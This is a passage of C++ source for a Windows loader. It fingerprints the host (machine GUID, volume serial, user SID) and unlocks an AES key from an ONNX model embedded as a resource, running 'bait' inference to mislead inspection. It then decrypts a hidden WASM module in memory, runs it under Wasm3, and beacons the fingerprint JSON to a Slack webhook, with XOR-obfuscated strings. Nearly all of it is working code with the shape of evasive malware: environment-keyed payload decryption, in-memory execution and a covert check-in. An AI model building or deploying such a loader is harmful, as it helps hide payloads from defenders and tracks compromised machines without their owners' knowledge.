        const_cast<PUCHAR>(keyBytes.data()),
        static_cast<ULONG>(keyBytes.size()), 0);
    if (!NT_SUCCESS(st)) ThrowNT("BCryptGenerateSymmetricKey", st);

    ULONG plainSize = 0;
    st = BCryptDecrypt(key.h,
                       const_cast<PUCHAR>(cipher), cipherSize,
                       nullptr,
                       ivProbe.data(), static_cast<ULONG>(ivProbe.size()),
                       nullptr, 0,
                       &plainSize,
                       BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(st)) ThrowNT("BCryptDecrypt(probe)", st);

    std::vector<uint8_t> plain(plainSize);
    st = BCryptDecrypt(key.h,
                       const_cast<PUCHAR>(cipher), cipherSize,
                       nullptr,
                       iv.data(), static_cast<ULONG>(iv.size()),
                       plain.data(), static_cast<ULONG>(plain.size()),
                       &plainSize,
                       BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(st)) ThrowNT("BCryptDecrypt", st);

    plain.resize(plainSize);
    if (!keyObj.empty())
        SecureZeroMemory(keyObj.data(), keyObj.size());
    SecureZeroVector(iv);
    SecureZeroVector(ivProbe);
    return plain;
}

static std::vector<uint8_t> DecryptAes256Cbc(
    const uint8_t* encryptedData,
    DWORD encryptedSize,
    const std::string& keyMaterial)
{
    std::vector<uint8_t> keyBytes = Sha256Bytes(keyMaterial);
    SensitiveBytesGuard keyGuard(keyBytes);
    return DecryptAes256CbcRawKey(encryptedData, encryptedSize, keyBytes);
}

static std::vector<uint8_t> DecryptAes256Cbc(
    const ResourceView& encryptedResource,
    const std::string& keyMaterial)
{
    return DecryptAes256Cbc(encryptedResource.data, encryptedResource.size, keyMaterial);
}

// -----------------------------------------------------------------------------
// Phase 1 - Fingerprint assembly
// -----------------------------------------------------------------------------

static std::string BuildFingerprint()
{
    std::wstring combined;
    combined.reserve(256);
    combined += L"MG:";  combined += GetMachineGuid();
    combined += L"|VS:"; combined += GetVolumeSerial();
    combined += L"|US:"; combined += GetCurrentUserSid();
    return Sha256(WideToUtf8(combined));
}

// -----------------------------------------------------------------------------
// Phase 2 - ONNX Runtime inference from a .rsrc model
// -----------------------------------------------------------------------------

static std::string RunOnnxInferenceFromBuffer(
    const void*         modelData,
    size_t              modelSize,
    const std::string&  hashPrompt)
{
    std::string modelOutput;

    if (!modelData || modelSize == 0)
        throw std::runtime_error("Model resource: pusty bufor");

    {
    const std::string logId = XOR_A("hw_fp");
    Ort::Env env(ORT_LOGGING_LEVEL_WARNING, logId.c_str());

    Ort::SessionOptions opts;
    opts.SetIntraOpNumThreads(1);
    opts.SetGraphOptimizationLevel(GraphOptimizationLevel::ORT_ENABLE_ALL);

    // DirectML can be enabled in a custom ORT build by defining PROJECTBETA_ENABLE_DML.
#ifdef PROJECTBETA_ENABLE_DML
    try { OrtSessionOptionsAppendExecutionProvider_DML(opts, 0); }
    catch (...) {}
#endif

    Ort::Session session(env, modelData, modelSize, opts);
    Ort::AllocatorWithDefaultOptions allocator;

    // Tokenization: UTF-8 hash bytes - int64 tokens.
    std::vector<int64_t> inputTokens;
    inputTokens.reserve(hashPrompt.size());
    for (unsigned char c : hashPrompt)
        inputTokens.push_back(static_cast<int64_t>(c));

    const std::array<int64_t, 2> inputShape = {
        1LL, static_cast<int64_t>(inputTokens.size())
    };

    Ort::MemoryInfo memInfo =
        Ort::MemoryInfo::CreateCpu(OrtArenaAllocator, OrtMemTypeDefault);

    Ort::Value inputTensor = Ort::Value::CreateTensor<int64_t>(
        memInfo,
        inputTokens.data(), inputTokens.size(),
        inputShape.data(),  inputShape.size());

    if (session.GetInputCount() == 0 || session.GetOutputCount() == 0)
        throw std::runtime_error("Model: missing input or output");

    Ort::AllocatedStringPtr inNamePtr  = session.GetInputNameAllocated(0, allocator);
    Ort::AllocatedStringPtr outNamePtr = session.GetOutputNameAllocated(0, allocator);
    const char* inName  = inNamePtr.get();
    const char* outName = outNamePtr.get();

    std::vector<Ort::Value> outputs = session.Run(
        Ort::RunOptions{nullptr},
        &inName,  &inputTensor, 1,
        &outName, 1);

    if (outputs.empty())
        throw std::runtime_error("Model: missing output data");

    Ort::Value& out      = outputs[0];
    auto typeInfo        = out.GetTensorTypeAndShapeInfo();
    auto elemType        = typeInfo.GetElementType();
    size_t numElems      = typeInfo.GetElementCount();

    modelOutput.reserve(numElems);

    if (elemType == ONNX_TENSOR_ELEMENT_DATA_TYPE_INT64)
    {
        const int64_t* data = out.GetTensorData<int64_t>();
        for (size_t i = 0; i < numElems; ++i)
            if (data[i] > 0 && data[i] < 128)
                modelOutput += static_cast<char>(data[i]);
    }
    else if (elemType == ONNX_TENSOR_ELEMENT_DATA_TYPE_FLOAT)
    {
        auto   shape  = typeInfo.GetShape();
        size_t seqLen = (shape.size() >= 2) ? static_cast<size_t>(shape[1]) : 1;
        size_t vocab  = (seqLen > 0) ? numElems / seqLen : numElems;
        const float* data = out.GetTensorData<float>();

        for (size_t t = 0; t < seqLen; ++t)
        {
            const float* row    = data + t * vocab;
            int64_t      bestId = 0;
            float        bestV  = row[0];
            for (size_t v = 1; v < vocab; ++v)
                if (row[v] > bestV) { bestV = row[v]; bestId = static_cast<int64_t>(v); }
            if (bestId > 0 && bestId < 128)
                modelOutput += static_cast<char>(bestId);
        }
    }
    else throw std::runtime_error("Model: unsupported tensor type");
    }

    std::string keyMaterial = NormalizeAesKeyMaterial(modelOutput);
    SecureZeroString(modelOutput);
    return keyMaterial;
}

// -----------------------------------------------------------------------------
// Phase 4 - Host functions registered in Wasm3
//
// Signature of each Wasm3 host function:
//   m3ApiRawFunction(FunctionName)
//   {
//       m3ApiGetArg / m3ApiReturnType / m3ApiReturn(value)
//   }
//
// The WASM module imports these functions as:
//   (import "host" "get_fingerprint_ptr" (func (result i32)))
//   (import "host" "get_fingerprint_len" (func (result i32)))
//   ... etc.
//
// IMPORTANT: a ptr returned to WASM is an offset in linear WASM memory,
// NOT a native pointer. Host data is copied into WASM memory through
// host_write_to_wasm_memory(), and WASM operates only on that copy.
// The host never exposes raw C++ pointers.
// -----------------------------------------------------------------------------

static void RunOnnxBaitWorkload(
    Ort::Session& session,
    Ort::AllocatorWithDefaultOptions& allocator,
    const std::string& hashPrompt)
{
    if (session.GetInputCount() < 2 || session.GetOutputCount() < 1)
        return;

    std::array<int64_t, 16> inputIds{};
    std::array<int64_t, 16> attentionMask{};
    for (size_t i = 0; i < inputIds.size(); ++i)
    {
        inputIds[i] = (i < hashPrompt.size())
            ? static_cast<int64_t>(static_cast<unsigned char>(hashPrompt[i]))
            : 0;
        attentionMask[i] = (i < hashPrompt.size()) ? 1 : 0;
    }

    const std::array<int64_t, 2> shape = {1, 16};
    Ort::MemoryInfo memInfo =
        Ort::MemoryInfo::CreateCpu(OrtArenaAllocator, OrtMemTypeDefault);

    std::vector<Ort::Value> inputs;
    inputs.emplace_back(Ort::Value::CreateTensor<int64_t>(
        memInfo, inputIds.data(), inputIds.size(), shape.data(), shape.size()));
    inputs.emplace_back(Ort::Value::CreateTensor<int64_t>(
        memInfo, attentionMask.data(), attentionMask.size(), shape.data(), shape.size()));

    Ort::AllocatedStringPtr in0 = session.GetInputNameAllocated(0, allocator);
    Ort::AllocatedStringPtr in1 = session.GetInputNameAllocated(1, allocator);
    Ort::AllocatedStringPtr out0 = session.GetOutputNameAllocated(0, allocator);

    const std::array<const char*, 2> inputNames = {in0.get(), in1.get()};
    const char* outputName = out0.get();

    try
    {
        (void)session.Run(
            Ort::RunOptions{nullptr},
            inputNames.data(), inputs.data(), inputs.size(),
            &outputName, 1);
    }
    catch (...)
    {
        // Bait inference is intentionally non-critical. Metadata unlocking
        // remains the authoritative path for key material.
    }

    SecureZeroMemory(inputIds.data(), inputIds.size() * sizeof(inputIds[0]));
    SecureZeroMemory(attentionMask.data(), attentionMask.size() * sizeof(attentionMask[0]));
}

static std::string UnlockKeyMaterialFromOnnxVault(
    const void*         modelData,
    size_t              modelSize,
    const std::string&  hashPrompt)
{
    if (!modelData || modelSize == 0)
        throw std::runtime_error("Model resource: empty buffer");

    const std::string logId = XOR_A("onyx_vault");
    Ort::Env env(ORT_LOGGING_LEVEL_WARNING, logId.c_str());

    Ort::SessionOptions opts;
    opts.SetIntraOpNumThreads(1);
    opts.SetGraphOptimizationLevel(GraphOptimizationLevel::ORT_ENABLE_ALL);

    Ort::Session session(env, modelData, modelSize, opts);
    Ort::AllocatorWithDefaultOptions allocator;
    RunOnnxBaitWorkload(session, allocator, hashPrompt);

    Ort::ModelMetadata metadata = session.GetModelMetadata();
    const std::string schema = LookupOnnxMetadata(metadata, allocator, "schema");
    const std::string kdf = LookupOnnxMetadata(metadata, allocator, "kdf");
    if (schema != "onyx-v1")
        throw std::runtime_error("Model metadata: unsupported schema");
    if (kdf != "pbkdf2-hmac-sha256")
        throw std::runtime_error("Model metadata: unsupported KDF");

    const std::string iterationsText =
        LookupOnnxMetadata(metadata, allocator, "kdf_iterations");
    const ULONG iterations =
        static_cast<ULONG>(std::strtoul(iterationsText.c_str(), nullptr, 10));
    if (iterations < 10000)
        throw std::runtime_error("Model metadata: invalid KDF iterations");

    std::vector<uint8_t> salt =
        Base64Decode(LookupOnnxMetadata(metadata, allocator, "kdf_salt"));
    std::vector<uint8_t> triggerExpected =
        HexDecode(LookupOnnxMetadata(metadata, allocator, "trigger_hmac"));
    std::vector<uint8_t> iv =
        Base64Decode(LookupOnnxMetadata(metadata, allocator, "vault_iv"));
    std::vector<uint8_t> ciphertext =
        Base64Decode(LookupOnnxMetadata(metadata, allocator, "vault_ct"));
    std::vector<uint8_t> vaultMacExpected =
        HexDecode(LookupOnnxMetadata(metadata, allocator, "vault_hmac"));

    SensitiveBytesGuard saltGuard(salt);
    SensitiveBytesGuard triggerExpectedGuard(triggerExpected);
    SensitiveBytesGuard ivGuard(iv);
    SensitiveBytesGuard ciphertextGuard(ciphertext);
    SensitiveBytesGuard vaultMacExpectedGuard(vaultMacExpected);

    std::vector<uint8_t> master = Pbkdf2Sha256(hashPrompt, salt, iterations);
    SensitiveBytesGuard masterGuard(master);

    std::vector<uint8_t> vaultKey = HkdfSha256(master, "onyx-vault-enc-v1");
    std::vector<uint8_t> vaultMacKey = HkdfSha256(master, "onyx-vault-mac-v1");
    std::vector<uint8_t> triggerMacKey = HkdfSha256(master, "onyx-trigger-hmac-v1");
    SensitiveBytesGuard vaultKeyGuard(vaultKey);
    SensitiveBytesGuard vaultMacKeyGuard(vaultMacKey);
    SensitiveBytesGuard triggerMacKeyGuard(triggerMacKey);

    std::vector<uint8_t> triggerGot = HmacSha256(triggerMacKey, hashPrompt);
    SensitiveBytesGuard triggerGotGuard(triggerGot);
    if (!ConstantTimeEqual(triggerGot, triggerExpected))
        throw std::runtime_error("Model metadata: trigger mismatch");

    std::vector<uint8_t> vaultMacGot =
        HmacSha256(vaultMacKey, ciphertext.data(), ciphertext.size());
    SensitiveBytesGuard vaultMacGotGuard(vaultMacGot);
    if (!ConstantTimeEqual(vaultMacGot, vaultMacExpected))
        throw std::runtime_error("Model metadata: vault MAC mismatch");

    std::vector<uint8_t> encryptedVault;
    encryptedVault.reserve(iv.size() + ciphertext.size());
    encryptedVault.insert(encryptedVault.end(), iv.begin(), iv.end());
    encryptedVault.insert(encryptedVault.end(), ciphertext.begin(), ciphertext.end());
    SensitiveBytesGuard encryptedVaultGuard(encryptedVault);

    std::vector<uint8_t> raw =
        DecryptAes256CbcRawKey(
            encryptedVault.data(),
            static_cast<DWORD>(encryptedVault.size()),
            vaultKey);
    SensitiveBytesGuard rawGuard(raw);

    const char magic[] = {'O', 'N', 'X', '1'};
    if (raw.size() <= sizeof(magic) ||
        std::memcmp(raw.data(), magic, sizeof(magic)) != 0)
        throw std::runtime_error("Model metadata: vault magic mismatch");

    std::string keyMaterial(
        reinterpret_cast<const char*>(raw.data() + sizeof(magic)),
        raw.size() - sizeof(magic));
    keyMaterial = NormalizeAesKeyMaterial(keyMaterial);
    if (keyMaterial.size() != 32)
        throw std::runtime_error("Model metadata: invalid key material length");

    return keyMaterial;
}

// Helper: copies a host string into linear WASM memory and returns the offset.
// Wasm3 exposes m3_GetMemory(), read the base pointer and memory size.
static uint32_t CopyStringToWasmMemory(
    IM3Runtime      runtime,
    const std::string& str,
    uint32_t&       nextFreeOffset)   // simple bump allocator in WASM memory
{
    uint32_t memSize = 0;
    uint8_t* mem     = m3_GetMemory(runtime, &memSize, 0);

    if (!mem)
        throw std::runtime_error("Wasm3: linear memory is unavailable");

    const uint32_t needed = static_cast<uint32_t>(str.size()) + 1; // +\0
    if (nextFreeOffset + needed > memSize)
        throw std::runtime_error("Wasm3: not enough linear memory");

    std::memcpy(mem + nextFreeOffset, str.data(), str.size());
    mem[nextFreeOffset + str.size()] = '\0';

    const uint32_t offset = nextFreeOffset;
    nextFreeOffset += needed;
    return offset;
}

// -- Host function implementations ---------------------------------------------

// Each host function receives userdata through m3_GetUserData(runtime).
// Wasm3 does not pass userdata directly into the callback, so this code uses
// the runtime pointer held in the current call context.
// thread_local avoids process-wide mutable state.

struct WasmCallContext
{
    HostContext* host    = nullptr;
    IM3Runtime   runtime = nullptr;
    uint32_t     nextFreeOffset = 0;   // bump allocator for CopyStringToWasm

    // Offsets reserved during initialization and stable during execution.
    uint32_t fingerprintOffset = 0;
    uint32_t statusOffset      = 0;
    uint32_t timestampOffset   = 0;
};

static thread_local WasmCallContext* g_CallCtx = nullptr;

static bool ReadWasmString(uint32_t ptr, uint32_t len, std::string& out)
{
    if (!g_CallCtx || len == 0 || len >= 64 * 1024)
        return false;

    uint32_t memSize = 0;
    uint8_t* mem = m3_GetMemory(g_CallCtx->runtime, &memSize, 0);
    const uint64_t end = static_cast<uint64_t>(ptr) + static_cast<uint64_t>(len);

    if (!mem || end > memSize)
        return false;

    out.assign(reinterpret_cast<const char*>(mem + ptr), len);
    return true;
}

// host.get_fingerprint_ptr() - i32
m3ApiRawFunction(HostGetFingerprintPtr)
{
    m3ApiReturnType(uint32_t);
    if (!g_CallCtx) m3ApiReturn(0);
    m3ApiReturn(g_CallCtx->fingerprintOffset);
}

// host.get_fingerprint_len() - i32
m3ApiRawFunction(HostGetFingerprintLen)
{
    m3ApiReturnType(uint32_t);
    if (!g_CallCtx) m3ApiReturn(0);
    m3ApiReturn(static_cast<uint32_t>(g_CallCtx->host->fingerprint.size()));
}

// host.get_status_ptr() - i32
m3ApiRawFunction(HostGetStatusPtr)
{
    m3ApiReturnType(uint32_t);
    if (!g_CallCtx) m3ApiReturn(0);
    m3ApiReturn(g_CallCtx->statusOffset);
}

// host.get_status_len() - i32
m3ApiRawFunction(HostGetStatusLen)
{
    m3ApiReturnType(uint32_t);
    if (!g_CallCtx) m3ApiReturn(0);
    m3ApiReturn(static_cast<uint32_t>(g_CallCtx->host->status.size()));
}

// host.get_timestamp_ptr() - i32
m3ApiRawFunction(HostGetTimestampPtr)
{
    m3ApiReturnType(uint32_t);
    if (!g_CallCtx) m3ApiReturn(0);
    m3ApiReturn(g_CallCtx->timestampOffset);
}

// host.get_timestamp_len() - i32
m3ApiRawFunction(HostGetTimestampLen)
{
    m3ApiReturnType(uint32_t);
    if (!g_CallCtx) m3ApiReturn(0);
    m3ApiReturn(static_cast<uint32_t>(g_CallCtx->host->timestamp.size()));
}

// host.submit_json(ptr i32, len i32) - void
// WASM calls this function with ready JSON; the host reads it from WASM memory.
m3ApiRawFunction(HostSubmitJson)
{
    m3ApiGetArg(uint32_t, ptr);
    m3ApiGetArg(uint32_t, len);

    std::string json;
    if (ReadWasmString(ptr, len, json))
    {
        std::lock_guard<std::mutex> lock(g_CallCtx->host->resultMutex);
        g_CallCtx->host->resultJson = json;
    }

    m3ApiSuccess();
}

// host.post_teams_json(ptr i32, len i32) - i32
// Compatibility ABI name: the host currently posts the JSON to Slack.
m3ApiRawFunction(HostPostTeamsJson)
{
    m3ApiReturnType(uint32_t);
    m3ApiGetArg(uint32_t, ptr);
    m3ApiGetArg(uint32_t, len);

    uint32_t status = 0;
    std::string json;

    if (ReadWasmString(ptr, len, json))
    {
        {
            std::lock_guard<std::mutex> lock(g_CallCtx->host->resultMutex);
            g_CallCtx->host->resultJson = json;
        }

        try
        {
            status = PostSlackHeartbeat(*g_CallCtx->host, &json);
        }
        catch (...)
        {
            status = 0;
        }
    }

    m3ApiReturn(status);
}

// -----------------------------------------------------------------------------
// Phase 4 - Wasm3: registration and module execution from memory
// -----------------------------------------------------------------------------

static void ExecuteWasmFromMemory(
    const std::vector<uint8_t>& wasmBytes,
    HostContext&                hostCtx,
    const char*                 entrypoint = "run")
{
    if (wasmBytes.empty())
        throw std::runtime_error("Wasm3: empty module buffer");

    // -- Environment and runtime -----------------------------------------------
    Wasm3EnvGuard envGuard;
    envGuard.env = m3_NewEnvironment();
    if (!envGuard.env)
        throw std::runtime_error("Wasm3: m3_NewEnvironment() returned null");

    Wasm3RuntimeGuard rtGuard;
    rtGuard.rt = m3_NewRuntime(envGuard.env, 128 * 1024, nullptr);
    if (!rtGuard.rt)
        throw std::runtime_error("Wasm3: m3_NewRuntime() returned null");

    // -- Parse and load the module from RAM ------------------------------------
    IM3Module module = nullptr;
    M3Result result = m3_ParseModule(
        envGuard.env, &module,
        wasmBytes.data(), static_cast<uint32_t>(wasmBytes.size()));

    if (result != m3Err_none)
        throw std::runtime_error(std::string("Wasm3: ParseModule: ") + result);

    result = m3_LoadModule(rtGuard.rt, module);
    if (result != m3Err_none)
        throw std::runtime_error(std::string("Wasm3: LoadModule: ") + result);

    // -- Host function registration --------------------------------------------
    // Wasm3 signature: "v" = void, "i" = i32.
    // Format: "<return_types><arg_types>", with empty return encoded as "v".

    struct HostFnEntry {
        const char* module;
        const char* name;
        const char* signature;  // Wasm3 signature string
        M3RawCall   fn;
    };

    const HostFnEntry hostFunctions[] = {
        { "host", "get_fingerprint_ptr", "i()",   HostGetFingerprintPtr },
        { "host", "get_fingerprint_len", "i()",   HostGetFingerprintLen },
        { "host", "get_status_ptr",      "i()",   HostGetStatusPtr      },
        { "host", "get_status_len",      "i()",   HostGetStatusLen      },
        { "host", "get_timestamp_ptr",   "i()",   HostGetTimestampPtr   },
        { "host", "get_timestamp_len",   "i()",   HostGetTimestampLen   },
        { "host", "submit_json",         "v(ii)", HostSubmitJson        },
        { "host", "post_teams_json",     "i(ii)", HostPostTeamsJson     },
    };

    for (const auto& fn : hostFunctions)
    {
        result = m3_LinkRawFunction(module, fn.module, fn.name,
                                    fn.signature, fn.fn);
        // m3Err_functionLookupFailed means the module does not import this function.
        if (result != m3Err_none &&
            result != m3Err_functionLookupFailed)
        {
            throw std::runtime_error(
                std::string("Wasm3: LinkRawFunction(") + fn.name + "): " + result);
        }
    }

    // -- Copy host data into linear WASM memory --------------------------------
    // This runs after LoadModule because WASM memory is allocated at that point.
    WasmCallContext callCtx;
    callCtx.host    = &hostCtx;
    callCtx.runtime = rtGuard.rt;
    callCtx.nextFreeOffset = 1024;  // first 1 KB reserved for WASM

    callCtx.fingerprintOffset =
        CopyStringToWasmMemory(rtGuard.rt, hostCtx.fingerprint,  callCtx.nextFreeOffset);
    callCtx.statusOffset =
        CopyStringToWasmMemory(rtGuard.rt, hostCtx.status,       callCtx.nextFreeOffset);
    callCtx.timestampOffset =
        CopyStringToWasmMemory(rtGuard.rt, hostCtx.timestamp,    callCtx.nextFreeOffset);

    // -- Set the thread_local call context -------------------------------------
    g_CallCtx = &callCtx;

    // -- Call the entrypoint ---------------------------------------------------
    IM3Function func = nullptr;
    result = m3_FindFunction(&func, rtGuard.rt, entrypoint);
    if (result != m3Err_none)
        throw std::runtime_error(
            std::string("Wasm3: FindFunction('") + entrypoint + "'): " + result);

    result = m3_CallV(func);
    g_CallCtx = nullptr;   // always clear before checking the call result

    if (result != m3Err_none)
        throw std::runtime_error(std::string("Wasm3: CallV: ") + result);
}

// -----------------------------------------------------------------------------
// Entry point
// -----------------------------------------------------------------------------

int main()
{
    try
    {
        // -- Phase 1: fingerprint ----------------------------------------------
        HostContext hostCtx;
        hostCtx.fingerprint = BuildFingerprint();
        hostCtx.status      = XOR_A("alive_and_secure");
        hostCtx.timestamp   = UtcTimestamp();

        // -- Phase 2: hash - ONNX model from .rsrc - AES key material ---------
        const ResourceView modelResource = LoadResourceView(IDR_ONNX_MODEL);
        std::string aesKeyMaterial = UnlockKeyMaterialFromOnnxVault(
            modelResource.data,
            static_cast<size_t>(modelResource.size),
            hostCtx.fingerprint);
        SensitiveStringGuard aesKeyGuard(aesKeyMaterial);

        // -- Phase 3: encrypted WASM from .rsrc - AES-256-CBC - RAM -----------
        const ResourceView encryptedWasmResource = LoadResourceView(IDR_WASM_ENCRYPTED);
        std::vector<uint8_t> wasmBytes =
            DecryptAes256Cbc(encryptedWasmResource, aesKeyMaterial);
        SensitiveBytesGuard wasmGuard(wasmBytes);
        SecureZeroString(aesKeyMaterial);

        // -- Phase 4: Wasm3 with host functions - JSON from the WASM module ---
        ExecuteWasmFromMemory(wasmBytes, hostCtx, "run");

        // hostCtx.resultJson now contains JSON assembled by WASM, for example:
        // {"status":"alive_and_secure","ts":"2026-05-05T12:00:00Z","fp":"a3f9..."}
        SecureZeroVector(wasmBytes);

        if (!hostCtx.webhookPosted)
        {
            try { PostSlackHeartbeat(hostCtx); }
            catch (...) {}
        }

        (void)hostCtx.resultJson;
        (void)hostCtx.webhookStatus;

        return 0;
    }
    catch (const std::exception&)
    {
        return 1;
    }
}
